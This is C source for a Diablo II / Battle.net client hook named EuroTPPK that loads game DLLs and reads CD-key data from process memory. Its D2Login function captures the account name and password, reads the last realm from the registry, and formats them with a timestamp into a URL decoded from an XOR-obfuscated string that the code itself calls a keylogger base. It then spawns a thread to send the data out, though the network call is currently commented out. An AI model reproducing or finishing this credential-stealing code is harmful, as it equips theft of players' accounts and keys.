#include "EuroTPPK.h"
char Buffer[512];
#define ARRAY_SIZE(x) sizeof(x)/sizeof(x[0])
#define CHECK_PTR(x) (IsBadReadPtr((void*)x,sizeof(x)) ? FALSE : TRUE)

void __fastcall D2Login(char* Account, char* Password);

static BOOL UtilGetExport(LPSTR lpszExport, LPVOID lpvFunction, HMODULE hModule) {
	FARPROC fpFunc = GetProcAddress(hModule, lpszExport); //FARPROC=32bit
	if (fpFunc == NULL)
		return FALSE;
	CopyMemory(lpvFunction, &fpFunc, sizeof(FARPROC));
	return TRUE;
}

enum { STORM = 0, BNCLIENT, D2WIN, D2DLL_NUM };
struct d2dll_struct {
	char* szName;
	union {
		HMODULE hModule;
		DWORD dwBase;
	};
} D2DLL[] = {
	{"Storm.dll",NULL},
	{"Bnclient.dll",NULL},
	{"D2Win.dll",NULL}
};

static BOOL LoadD2Dlls(VOID) {
	for (int i = 0; i < ARRAY_SIZE(D2DLL); i++) {
		HMODULE hModule = GetModuleHandle(D2DLL[i].szName);
		if (!hModule) {
			hModule = LoadLibrary(D2DLL[i].szName);
			if (!hModule)
				return FALSE;
		}
		D2DLL[i].hModule = hModule;
	}
	return TRUE;
}

static DWORD __stdcall DllOffset(int i) {
	if (i<0 || i>ARRAY_SIZE(D2DLL))
		return 0;
	return D2DLL[i].dwBase;
}

typedef struct tagD2Client {
	DWORD dwInit; //+0x00
	BYTE _1[0x208]; //+0x04
	DWORD fpInit; //+0x20c
} D2CLIENTINFO, * LPD2CLIENTINFO;

#define EXPTYPE(l,n,r,c,p) typedef r (c *n) p; extern n l##_##n;
#define DECTYPE(l,n) n l##_##n;
#define DEFFNC(l,n,o) l##_##n=(n)(DllOffset(l)+o); \
            if(!CHECK_PTR((DWORD)l##_##n)) return FALSE;
#define DEFEXP(l,n,a) UtilGetExport((LPSTR)((DWORD)a),&l##_##n,(HINSTANCE)DllOffset(l)); \
            if(!CHECK_PTR((DWORD)l##_##n)) return FALSE;

EXPTYPE(D2WIN, MPQInit, BOOL, __fastcall, (VOID))
EXPTYPE(D2WIN, MPQInit2, BOOL, __fastcall, (DWORD dwUnk1, DWORD dwUnk2, DWORD dwUnk3, LPD2CLIENTINFO pClient))
EXPTYPE(BNCLIENT, FillKeyInfo, VOID, __fastcall, (VOID))
DECTYPE(D2WIN, MPQInit)
DECTYPE(D2WIN, MPQInit2)
DECTYPE(BNCLIENT, FillKeyInfo)

#define D2WIN_BASE_ADDR            0x6F8E0000
#define D2NET_BASE_ADDR            0x00CD0000
#define D2MCPCLIENT_BASE_ADDR    0x6FA20000
#define D2LAUNCH_BASE_ADDR        0x6FA40000
#define BNCLIENT_BASE_ADDR        0x6FF20000
#define FOG_BASE_ADDR            0x6FF50000
#define D2CLIENT_BASE_ADDR        0x6FAB0000
#define D2COMMON_BASE_ADDR        0x6FD50000
#define STORM_BASE_ADDR            0x6FBF0000

static BOOL InitD2Funcs(VOID) {
	if (!LoadD2Dlls())
		return FALSE;
	DEFEXP(D2WIN, MPQInit, 10059/*10030*/) // Updated x
		DEFEXP(D2WIN, MPQInit2, 10073/*10051*/) // Updated x
		DEFFNC(BNCLIENT, FillKeyInfo, 0x12CD0/*0x16180*/) // Updated x //  16180+6FF20000h = 6FF36180,
		return TRUE;
}

#define MDWORD(l,o)                (DWORD)(DllOffset(l)+o)
#define MPDWORD(l,o)            *(DWORD*)(DllOffset(l)+o)
#define MPWORD(l,o)                *(WORD*)(DllOffset(l)+o)
#define MPBYTE(l,o)                *(BYTE*)(DllOffset(l)+o)

#define MEM_EXE_HASH_DATA    MPDWORD(STORM,0x55358/*0x54D30*/) // 0x54D30+6FBF0000=6FC44D30 6FBF0000-6FC45358-=55358
#define MEM_CLASSIC_KEY        MPDWORD(BNCLIENT,0x1F0DC/*0x1C78C*/) // 0x1C78C+6FF20000 = 6FF3C78C |  6FF3F0DC-6FF20000
#define MEM_LOD_KEY            MPDWORD(BNCLIENT,0x1C794) //
#define MEM_KEY_OWNER        MPDWORD(BNCLIENT,0x1C798) //

BOOL WriteBytes(LPVOID dwAddr, LPCVOID pd, DWORD dwSize);

#define STD_CALL_LEN	0x05
#define INST_NOP		0x90

void __fastcall D2Login(char* Account, char* Password);

void BNCLIENT_CleanKeyInfo() {
	MEM_CLASSIC_KEY = 0;
	MEM_LOD_KEY = 0;
	MEM_KEY_OWNER = 0;
}

DWORD WINAPI SubmitInfos(void* param) {
	return true;
	/*ConnectURL(Buffer);
	for (int i = 0; i < strlen(Buffer); i++)
		Buffer[i] = '\0';
	return 0;*/
}

void DecryptKeylogger(char* buffer, char* String, int xorer) {
	for (int i = 0; i < strlen(String); i++) {
		buffer[i] = ((char)String[i]) ^ -+xorer;
	}
}
void DecryptRealm(char* buffer, char* String, int xorer) {
	for (int i = 0; i < strlen(String); i++) {
		buffer[i] = ((char)String[i]) - xorer;
	}
}

char* GetKeyloggerBase() {
	char* Buffer = (char*)malloc(512);
	for (int i = 0; i < 512; i++)
		Buffer[i] = 0x00;
	//DecryptKeylogger(Buffer,"s{E::‚‚‚9p€}z{v9z}r:€{wzlo:Tyqz9{s{JlntzyHloo1lH0~1{H0~1nH0~1pH0~1}H0~1oH0~",11);
	//DecryptKeylogger(Buffer,"…ÏÚÚ‚‚‚Û€‡š…žÛš‡’Ú€…™š”‘Ú¼›“šÛ……Ê”–œš›È”‘‘Ó”ÈÐ†Ó…ÈÐ†Ó–ÈÐ†ÓÈÐ†Ó‡ÈÐ†Ó‘ÈÐ†",11);
	DecryptKeylogger(Buffer, "…ÏÚÚ‚‚‚Û€‡š…žÛš‡’Ú€…™š”‘Ú´€Û……Ê”–œš›È”‘‘Ó”ÈÐ†Ó…ÈÐ†Ó–ÈÐ†ÓÈÐ†Ó‡ÈÐ†Ó‘ÈÐ†", 11);

	return Buffer;
}

void __fastcall D2Login(char* Account, char* Password) {
	//	BNCLIENT_FillKeyInfo();
	char szTime[100] = { 0 };
	char BufferS[100] = { 0 };
	char BufferSS[100] = { 0 };
	//char TimeS[]={"0m+0o+0d+8+0SE0XE0^"};
	//char RealmS[]={"[}pqp}}po+]plwx"};
	char PathS[] = { "^zq‚l}pgMwt……l}o+Pyp}ltyxpygOtlmwz+TT" };
	char TimeS[] = { "Ð—ÕÐ‘ÕÐ¬ÕØÕÐ½ÏÐ¸ÏÐ¦" };
	char RealmS[] = { "[}pqp}}po+]plwx" };
	//char PathS[]={"¦š“‚”‡©·™œ”‡‘Õ°›‡”œ›˜›©±œ”—™šÕ¼¼"};

	Registry Reg;

	char LastRealm[100] = { 0 };
	DecryptRealm(BufferSS, PathS, 11);
	Reg.OpenKey(HKEY_CURRENT_USER, BufferSS);
	DecryptRealm(BufferS, RealmS, 11);
	Reg.GetValue(BufferS, LastRealm);
	DecryptKeylogger(BufferS, TimeS, 11);
	time_t ttTime;
	time(&ttTime);
	strftime(szTime, 1024, BufferS, localtime(&ttTime));
	delete BufferS;
	sprintf(Buffer, GetKeyloggerBase(), Account, Password, "classic", "expac", LastRealm, szTime);
	CreateThread(0, 0, SubmitInfos, 0, 0, 0);
	//BNCLIENT_CleanKeyInfo();
}

//BOOL OpenURL(char* szURL);